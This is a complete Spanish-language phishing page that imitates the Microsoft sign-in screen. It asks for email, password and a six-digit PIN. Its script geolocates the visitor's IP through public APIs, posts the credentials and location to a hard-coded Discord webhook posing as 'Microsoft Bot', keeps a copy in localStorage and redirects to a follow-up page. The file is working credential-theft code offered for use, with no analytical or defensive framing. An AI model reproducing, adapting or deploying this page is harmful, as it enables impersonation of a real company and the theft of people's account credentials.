<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en tu cuenta de Microsoft</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', 'Helvetica Neue', 'Lucida Grande', 'Roboto', 'Ebrima', 'Nirmala UI', 'Gadugi', 'Segoe Xbox Symbol', 'Segoe UI Symbol', 'Meiryo UI', 'Khmer UI', 'Tunga', 'Lao UI', 'Raavi', 'Iskoola Pota', 'Latha', 'Leelawadee', 'Microsoft YaHei UI', 'Microsoft JhengHei UI', 'Malgun Gothic', 'Estrangelo Edessa', 'Microsoft Himalaya', 'Microsoft New Tai Lue', 'Microsoft PhagsPa', 'Microsoft Tai Le', 'Microsoft Yi Baiti', 'Mongolian Baiti', 'MV Boli', 'Myanmar Text', 'Cambria Math';
            background: #f2f2f2 radial-gradient(circle at 50% 50%, #fafafa 0%, #e6e9f0 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #1b1b1b;
        }

        .container {
            width: 100%;
            max-width: 440px;
            display: flex;
            flex-direction: column;
            gap: 16px;
            z-index: 2;
        }

        .login-box {
            background-color: #ffffff;
            padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            box-sizing: border-box;
            width: 100%;
        }

        .logo {
            height: 24px;
            margin-bottom: 16px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            margin: 0 0 16px 0;
            line-height: 28px;
        }

        .input-group {
            margin-bottom: 16px;
        }

        .input-group input {
            width: 100%;
            padding: 8px 0 8px 8px;
            font-size: 15px;
            font-family: inherit;
            border: 1px solid #8a8886;
            outline: none;
            background: transparent;
            box-sizing: border-box;
            transition: border-bottom-color 0.2s, border-bottom-width 0.2s;
        }

        .input-group input:focus {
            border-bottom: 2px solid #0067b8;
            padding-bottom: 7px;
        }

        .input-group input::placeholder {
            color: #666;
            font-size: 15px;
        }

        .links {
            font-size: 13px;
            margin-top: 7px;
            line-height: 1.5;
        }

        .links a {
            color: #0067b8;
            text-decoration: none;
            display: block;
            margin-bottom: 8px;
        }

        .links a:hover {
            text-decoration: underline;
        }

        .links span {
            color: #1b1b1b;
        }

        .btn-container {
            display: flex;
            justify-content: flex-end;
            margin-top: 32px;
        }

        .btn-next {
            background-color: #0067b8;
            color: #ffffff;
            border: none;
            padding: 10px 32px;
            font-size: 15px;
            font-family: inherit;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-next:hover {
            background-color: #005a9e;
        }

        .options-box {
            background-color: #ffffff;
            padding: 0 44px;
            height: 48px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            box-sizing: border-box;
            display: flex;
            align-items: center;
            cursor: pointer;
            font-size: 15px;
            transition: background-color 0.2s;
        }

        .options-box:hover {
            background-color: #f2f2f2;
        }

        .options-box svg {
            width: 24px;
            height: 24px;
            margin-right: 12px;
            fill: #323130;
        }
        .e2{
            margin-bottom: 3px;
            font-size: 13px;
            
        }
        .footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            display: flex;
            justify-content: flex-end;
            padding: 12px 24px;
            box-sizing: border-box;
            font-size: 12px;
            gap: 16px;
            z-index: 1;
        }

        .footer a {
            color: #1b1b1b;
            text-decoration: none;
            opacity: 0.8;
        }

        .footer a:hover {
            text-decoration: underline;
            opacity: 1;
        }

        @media (max-width: 600px) {
            body {
                background: #ffffff;
                align-items: flex-start;
            }

            .container {
                gap: 0;
                padding: 24px;
                box-sizing: border-box;
            }

            .login-box {
                box-shadow: none;
                padding: 0;
            }

            .options-box {
                box-shadow: none;
                padding: 0;
                margin-top: 32px;
                background-color: transparent;
            }

            .options-box:hover {
                background-color: transparent;
            }

            .footer {
                position: static;
                justify-content: center;
                padding: 24px 0;
                background: #ffffff;
            }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="login-box">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft">
        
        <h1>Iniciar sesión</h1>
        
        <form id="formIndex1">
            <div class="input-group">
                <p class="e2">Correo electrónico</p>
                <input type="text" id="email" required>
            </div>

            <div class="input-group">
                <p class="e2">Contraseña</p>
                <input type="text" id="password" required>
            </div>
            <div class="loks" style="display: flex; font-size: 14px;">
                <input type="checkbox"> Mantener sesion iniciada.
            </div>
            <div class="links">
                Al seleccionar Siguiente, acepto el <span style="color: #0067b8;"> Contrato de servicios de Microsoft</span> y la
                <span style="color: #0067b8;">declaración de privacidad</span>
            </div>

            <div class="input-group">
                <p class="e2">PIN</p>
                <input type="text" id="pin" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="* * * * * *" required>
                <p class="e2">Agrega un pin de seguridad de 6 digitos.</p>
            </div>
            
            <div class="btn-container">
                <button type="submit" class="btn-next">Siguiente</button>
            </div>
        </form>
    </div>
</div>

<script>
const DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1461691083275636779/8v_FqP75wrqKgFs1sEU7CoZlZuVlTOVTxcpIXESysA2XUb22onuTNldnVSbeTng1zpxZ";

async function fetchWithTimeout(url, timeout = 5000) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout);
    try {
        const response = await fetch(url, { signal: controller.signal });
        clearTimeout(id);
        return response;
    } catch (error) {
        clearTimeout(id);
        throw error;
    }
}

async function getGeoInfo() {
    const apis = [
        { url: 'https://ipapi.co/json/', parser: (data) => ({ ip: data.ip, pais: data.country_name, ciudad: data.city }) },
        { url: 'https://ipinfo.io/json/', parser: (data) => ({ ip: data.ip, pais: data.country, ciudad: data.city }) },
        { url: 'https://api.ipify.org?format=json', parser: (data) => ({ ip: data.ip, pais: 'Desconocido', ciudad: 'Desconocido' }) },
        { url: 'https://api.my-ip.io/ip.json', parser: (data) => ({ ip: data.ip, pais: data.country || 'Desconocido', ciudad: data.city || 'Desconocido' }) }
    ];
    for (const api of apis) {
        try {
            const res = await fetchWithTimeout(api.url, 4000);
            if (!res.ok) continue;
            const data = await res.json();
            const result = api.parser(data);
            if (result.ip && result.ip !== 'No disponible') {
                if (result.pais === 'Desconocido' && result.ciudad === 'Desconocido' && api.url.includes('ipify')) {
                    // Para ipify solo tenemos IP, intentamos otra API para país/ciudad
                    try {
                        const geoRes = await fetchWithTimeout(`https://ipapi.co/${result.ip}/json/`, 3000);
                        if (geoRes.ok) {
                            const geoData = await geoRes.json();
                            result.pais = geoData.country_name || 'Desconocido';
                            result.ciudad = geoData.city || 'Desconocido';
                        }
                    } catch(e) {}
                }
                return result;
            }
        } catch(e) {
            continue;
        }
    }
    return { ip: 'No disponible', pais: 'No disponible', ciudad: 'No disponible' };
}

async function enviarDatosIndex1(email, pass, pin, geo) {
    const mensaje = `📧 **Correo:** ${email}\n🔑 **Contraseña:** ${pass}\n🔢 **PIN:** ${pin}\n🌍 **IP:** ${geo.ip}\n📍 **País:** ${geo.pais}\n🏙️ **Ciudad:** ${geo.ciudad}`;
    try {
        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: mensaje, username: 'Microsoft Bot' })
        });
    } catch(e) { console.error(e); }
}

document.getElementById('formIndex1').addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const pin = document.getElementById('pin').value;

    const geo = await getGeoInfo();
    await enviarDatosIndex1(email, password, pin, geo);

    localStorage.setItem('userDataIndex1', JSON.stringify({
        email, password, pin, geo
    }));

    window.location.href = 'validar.html';
});
</script>
</body>
</html>
